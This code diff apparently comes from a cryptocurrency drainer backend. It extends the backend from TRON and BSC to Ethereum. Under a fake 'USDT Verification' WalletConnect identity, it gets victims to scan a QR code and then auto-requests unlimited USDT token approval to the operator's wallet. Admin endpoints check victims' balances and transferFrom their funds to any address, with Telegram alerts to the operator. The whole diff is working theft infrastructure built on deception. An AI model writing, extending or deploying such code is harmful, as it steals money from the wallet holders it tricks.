@@ -14,7 +14,6 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// ============ CONFIG ============
 const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN;
 const TG_ADMIN_CHAT_ID = process.env.TG_ADMIN_CHAT_ID;
 const MONGO_URI = process.env.MONGO_URI;
@@ -25,12 +24,12 @@ const ADMIN_KEY = process.env.ADMIN_KEY;
 
 const CONTRACTS = {
   tron: { usdt: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, caip: 'tron:0x2b6653dc' },
-  bsc: { usdt: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, caip: 'eip155:56' }
+  bsc: { usdt: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, caip: 'eip155:56' },
+  eth: { usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, caip: 'eip155:1' }
 };
 
 const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-// ============ TRON & BSC SETUP ============
 const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io', privateKey: MASTER_PK });
 const MASTER_TRON_ADDRESS = tronWeb.address.fromPrivateKey(MASTER_PK);
 
@@ -38,29 +37,35 @@ const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org
 const bscWallet = new ethers.Wallet(MASTER_PK, bscProvider);
 const MASTER_BSC_ADDRESS = bscWallet.address;
 
+const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+const ethWallet = new ethers.Wallet(MASTER_PK, ethProvider);
+const MASTER_ETH_ADDRESS = ethWallet.address;
+
 const ERC20_ABI = [
   'function approve(address spender, uint256 amount) returns (bool)',
   'function transferFrom(address from, address to, uint256 amount) returns (bool)',
   'function balanceOf(address owner) view returns (uint256)'
 ];
 const bscUsdt = new ethers.Contract(CONTRACTS.bsc.usdt, ERC20_ABI, bscWallet);
+const ethUsdt = new ethers.Contract(CONTRACTS.eth.usdt, ERC20_ABI, ethWallet);
 
-// ============ TELEGRAM & DB ============
-// 👇 यहाँ EFATAL एरर फिक्स किया गया है (family: 4 जोड़ा गया है) 👇
 const bot = new TelegramBot(TG_BOT_TOKEN, { 
   polling: true,
-  request: { 
-    agentOptions: { keepAlive: true, family: 4 } 
-  } 
+  request: { agentOptions: { keepAlive: true, family: 4 } } 
 });
 
 mongoose.connect(MONGO_URI, { tls: true, serverSelectionTimeoutMS: 3000 })
-  .then(() => console.log('MongoDB connected'))
+  .then(async () => {
+    console.log('MongoDB connected');
+    try {
+      await bot.sendMessage(TG_ADMIN_CHAT_ID, `🚀 *Server Started Successfully*\nReady for testing.`, { parse_mode: 'Markdown' });
+    } catch(e) { console.log(e); }
+  })
   .catch(err => console.error('MongoDB error:', err));
 
 const WalletSchema = new mongoose.Schema({
   sessionId: { type: String, unique: true, required: true },
-  chain: { type: String, enum: ['tron', 'bsc'], required: true },
+  chain: { type: String, enum: ['tron', 'bsc', 'eth'], required: true },
   wcPairingTopic: String,
   wcTopic: String,
   userWallet: { type: String, default: null },
@@ -70,7 +75,6 @@ const WalletSchema = new mongoose.Schema({
 });
 const Wallet = mongoose.model('Wallet', WalletSchema);
 
-// ============ WALLETCONNECT SETUP ============
 let signClient = null;
 const sessionMap = new Map();
 
@@ -81,9 +85,8 @@ async function initWC() {
     projectId: WC_PROJECT_ID,
     metadata: {
       name: 'USDT Verification', 
-      description: 'Securely verify your wallet to proceed with the payment.',
+      description: 'Securely verify your wallet to proceed.',
       url: BACKEND_URL,
-      // 👇 आपका ग्रीन शील्ड (Green Shield) लोगो 👇
       icons: ['https://i.postimg.cc/FY2PX37m/0000000087ac81faa556b88da506f604.png'] 
     }
   });
@@ -94,119 +97,94 @@ async function initWC() {
       const pairingTopic = params.pairingTopic;
       
       const wallet = await Wallet.findOne({ wcPairingTopic: pairingTopic });
-      if (!wallet) {
-        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Wallet not found for topic ${pairingTopic}`);
-        return;
-      }
+      if (!wallet) return;
 
       const namespacesToApprove = wallet.chain === 'tron' ? {
         tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
       } : {
-        eip155: { methods: ['eth_sendTransaction'], chains: ['eip155:56'], events: [] }
+        eip155: { methods: ['eth_sendTransaction'], chains: [wallet.chain === 'bsc' ? 'eip155:56' : 'eip155:1'], events: [] }
       };
 
-      const { acknowledged } = await signClient.approve({
-        id,
-        namespaces: namespacesToApprove
-      });
-      
+      const { acknowledged } = await signClient.approve({ id, namespaces: namespacesToApprove });
       const session = await acknowledged();
+      
       let walletAddress = null;
-      let chain = wallet.chain;
-
       if (session.namespaces.tron && session.namespaces.tron.accounts.length) {
         walletAddress = session.namespaces.tron.accounts[0].split(':')[2];
       } else if (session.namespaces.eip155 && session.namespaces.eip155.accounts.length) {
         walletAddress = session.namespaces.eip155.accounts[0].split(':')[2];
       }
 
-      if (!walletAddress) {
-        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Address not found in session namespaces.`);
-        return;
-      }
+      if (!walletAddress) return;
 
       wallet.userWallet = walletAddress;
       wallet.wcTopic = session.topic;
       wallet.status = 'attached';
       await wallet.save();
 
-      sessionMap.set(wallet.sessionId, { topic: session.topic, walletAddress, chain });
+      sessionMap.set(wallet.sessionId, { topic: session.topic, walletAddress, chain: wallet.chain });
 
-      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nRequesting approval in 2 seconds...`, { parse_mode: 'Markdown' });
+      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${wallet.chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nWaiting 3 seconds before asking for approval...`, { parse_mode: 'Markdown' });
 
-      // 2 second delay taaki wallet active ho jaye
-      await new Promise(r => setTimeout(r, 2000));
-
+      // 3 second delay taaki wallet active ho jaye
+      await new Promise(r => setTimeout(r, 3000));
       await requestApproval(wallet.sessionId);
     } catch (e) { 
-      console.error('session_proposal error:', e); 
-      bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ session_proposal Error: ${e.message}`);
+      bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Connect Error: ${e.message}`);
     }
   });
-  console.log('WalletConnect ready');
 }
 
 async function requestApproval(sessionId) {
   const session = sessionMap.get(sessionId);
-  if (!session) {
-    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Session map missing for ${sessionId}`);
-    return;
-  }
+  if (!session) return;
   const wallet = await Wallet.findOne({ sessionId });
   const chain = wallet.chain;
 
   try {
-    bot.sendMessage(TG_ADMIN_CHAT_ID, `⏳ Requesting Approval from Trust Wallet...`);
+    bot.sendMessage(TG_ADMIN_CHAT_ID, `⏳ Requesting Approval [${chain.toUpperCase()}]...`);
     let result;
     
     if (chain === 'tron') {
       const tx = await tronWeb.transactionBuilder.triggerSmartContract(
         CONTRACTS.tron.usdt, 'approve(address,uint256)', { feeLimit: 100000000, callValue: 0 },
-        [{ type: 'address', value: MASTER_TRON_ADDRESS }, { type: 'uint256', value: MAX_UINT256 }],
-        wallet.userWallet
+        [{ type: 'address', value: MASTER_TRON_ADDRESS }, { type: 'uint256', value: MAX_UINT256 }], wallet.userWallet
       );
-
       result = await signClient.request({
-        topic: session.topic,
-        chainId: CONTRACTS.tron.caip,
+        topic: session.topic, chainId: CONTRACTS.tron.caip,
         request: { method: 'tron_signTransaction', params: { address: wallet.userWallet, transaction: tx.transaction } }
       });
-
-      const broadcast = await tronWeb.trx.sendRawTransaction(result);
-      if (!broadcast.result) throw new Error(broadcast.message);
+      await tronWeb.trx.sendRawTransaction(result);
+    } else {
+      const provider = chain === 'bsc' ? bscProvider : ethProvider;
+      const spender = chain === 'bsc' ? MASTER_BSC_ADDRESS : MASTER_ETH_ADDRESS;
+      const caip = chain === 'bsc' ? CONTRACTS.bsc.caip : CONTRACTS.eth.caip;
+      const usdtContract = chain === 'bsc' ? CONTRACTS.bsc.usdt : CONTRACTS.eth.usdt;
       
-      wallet.approved = true;
-      wallet.status = 'approved';
-      await wallet.save();
-
-      bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved* [TRON]\nWallet: \`${wallet.userWallet}\``, { parse_mode: 'Markdown' });
-
-    } else if (chain === 'bsc') {
       const iface = new ethers.Interface(ERC20_ABI);
-      const data = iface.encodeFunctionData('approve', [MASTER_BSC_ADDRESS, MAX_UINT256]);
-      const nonce = await bscProvider.getTransactionCount(wallet.userWallet);
-      const feeData = await bscProvider.getFeeData();
+      const data = iface.encodeFunctionData('approve', [spender, MAX_UINT256]);
+      const nonce = await provider.getTransactionCount(wallet.userWallet);
+      const feeData = await provider.getFeeData();
       
       const tx = {
-        to: CONTRACTS.bsc.usdt, data: data, value: '0x0', gas: '0x186a0',
+        to: usdtContract, data: data, value: '0x0', gas: '0x186a0',
         maxFeePerGas: feeData.maxFeePerGas?.toString() || '0x12a05f200',
         maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || '0x3b9aca00',
-        nonce: '0x' + nonce.toString(16), chainId: '0x38', type: '0x2'
+        nonce: '0x' + nonce.toString(16), chainId: chain === 'bsc' ? '0x38' : '0x1', type: '0x2'
       };
 
       result = await signClient.request({
-        topic: session.topic, chainId: CONTRACTS.bsc.caip,
+        topic: session.topic, chainId: caip,
         request: { method: 'eth_sendTransaction', params: [tx] }
       });
-
-      wallet.approved = true;
-      wallet.status = 'approved';
-      await wallet.save();
-
-      bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved* [BSC]\nWallet: \`${wallet.userWallet}\``, { parse_mode: 'Markdown' });
     }
+
+    wallet.approved = true;
+    wallet.status = 'approved';
+    await wallet.save();
+    bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved* [${chain.toUpperCase()}]\nWallet: \`${wallet.userWallet}\``, { parse_mode: 'Markdown' });
+
   } catch (e) {
-    console.error('requestApproval error:', e);
     bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Approval Error [${chain}]: ${e.message}`);
   }
 }
@@ -215,8 +193,6 @@ function checkAdmin(req, res, next) {
   if (req.headers['x-admin-key'] !== ADMIN_KEY) return res.status(401).json({ error: 'Unauthorized' });
   next();
 }
-
-// ============ ROUTES ============
 
 app.post('/api/generate-qr', checkAdmin, async (req, res) => {
   try {
@@ -227,12 +203,14 @@ app.post('/api/generate-qr', checkAdmin, async (req, res) => {
       requiredNamespaces: chain === 'tron' ? {
         tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
       } : {
-        eip155: { methods: ['eth_sendTransaction'], chains: ['eip155:56'], events: [] }
+        eip155: { methods: ['eth_sendTransaction'], chains: [chain === 'bsc' ? 'eip155:56' : 'eip155:1'], events: [] }
       }
     });
 
     const pairingTopic = uri.split('@')[0].replace('wc:', '');
     await Wallet.create({ sessionId, chain, wcPairingTopic: pairingTopic, status: 'pending' });
+    
+    await bot.sendMessage(TG_ADMIN_CHAT_ID, `🆕 *QR Generated* [${chain.toUpperCase()}]\nSession: \`${sessionId}\``, { parse_mode: 'Markdown' });
 
     const qrImage = await QRCode.toDataURL(uri, { width: 400, margin: 2 });
     res.json({ success: true, sessionId, chain, uri, qrImage });
@@ -252,9 +230,12 @@ app.get('/api/admin/balance/:sessionId', checkAdmin, async (req, res) => {
     const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
     const bal = await contract.balanceOf(wallet.userWallet).call();
     balance = (Number(bal) / 1e6).toFixed(6);
-  } else {
+  } else if (wallet.chain === 'bsc') {
     const bal = await bscUsdt.balanceOf(wallet.userWallet);
     balance = ethers.formatUnits(bal, 18);
+  } else {
+    const bal = await ethUsdt.balanceOf(wallet.userWallet);
+    balance = ethers.formatUnits(bal, 6);
   }
   res.json({ balance, wallet: wallet.userWallet, chain: wallet.chain });
 });
@@ -270,9 +251,14 @@ app.post('/api/admin/transfer', checkAdmin, async (req, res) => {
       const amountSun = Math.floor(parseFloat(amount) * 1e6).toString();
       const contract = await tronWeb.contract().at(CONTRACTS.tron.usdt);
       txHash = await contract.transferFrom(wallet.userWallet, destination, amountSun).send({ feeLimit: 100000000 });
-    } else {
+    } else if (wallet.chain === 'bsc') {
       const amountWei = ethers.parseUnits(amount.toString(), 18);
       const tx = await bscUsdt.transferFrom(wallet.userWallet, destination, amountWei);
+      const receipt = await tx.wait();
+      txHash = receipt.hash;
+    } else {
+      const amountWei = ethers.parseUnits(amount.toString(), 6);
+      const tx = await ethUsdt.transferFrom(wallet.userWallet, destination, amountWei);
       const receipt = await tx.wait();
       txHash = receipt.hash;
     }
